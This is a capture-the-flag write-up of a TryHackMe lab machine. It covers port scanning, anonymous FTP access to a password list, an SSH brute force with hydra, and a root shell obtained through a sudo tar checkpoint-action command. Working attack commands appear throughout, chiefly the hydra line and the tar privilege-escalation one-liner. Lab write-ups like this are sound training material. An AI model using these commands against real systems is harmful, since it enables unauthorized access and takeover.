# BountyHunter

```
t3nsh0@KALI:~/htb/smag$ sudo nmap 10.10.146.130 -sC -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 21:11 CEST
Nmap scan report for 10.10.146.130
Host is up (0.071s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.10.225
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.86 seconds
```

Webpage telling us we have to hack this room... I downloaded the picture and tried steghide against it but nothing here.<br>
Nothing else here even after a gobuster scan.

# FTP
It's allowed in anonymous<br>
```
t3nsh0@KALI:~/htb/smag$ ftp 10.10.146.130
Connected to 10.10.146.130.
220 (vsFTPd 3.0.3)
Name (10.10.146.130:t3nsh0): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
```
locks.txt is a list of password and task has a username inside of it. 
# SSH
Let's brute force ssh !<br>
I used crackmap exec but it didn't work... I've lost a lot of time because of it...<br>
Let's brute force with hydra !<br>

```hydra -l <userame we found> -P locks.txt 10.10.146.130 ssh```<br>

We are connected and we have our user flag !<br>
# ROOT
Before running linpeas let's check sudo -l<br>
```xxxxxx@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for xxxxxx on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
``` 
<br>
There is a privesc with it on gtfobins so it's an easy win <br>

``sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
``

<br>
Let's run it :<br>

```lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# /bin/bash
root@bountyhacker:~/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
root@bountyhacker:~/Desktop# ls -l /root/
total 4
-rw-r--r-- 1 root root 19 Jun  7 17:16 root.txt
root@bountyhacker:~/Desktop# 
```

Here we go ! Very easy room but it's still nice to do it. <br>
Thanks [Sevuhl](https://tryhackme.com/p/Sevuhl) !
